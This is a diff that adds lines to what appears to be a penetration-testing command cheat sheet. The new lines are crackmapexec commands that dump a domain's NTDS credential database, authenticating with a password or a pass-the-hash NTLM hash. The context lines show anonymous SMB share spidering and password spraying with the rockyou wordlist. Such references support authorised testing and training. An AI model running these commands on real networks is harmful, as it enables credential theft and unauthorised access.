@@ -2121,6 +2121,10 @@ sqsh -S <RHOST> -U <USERNAME>
 crackmapexec smb <RHOST> -u '' -p '' --shares
 crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 crackmapexec smb <RHOST> -u <USERNAME> -p <PASSWORD> --shares
+crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
+crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
+crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
+crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
 crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
 crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
 crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
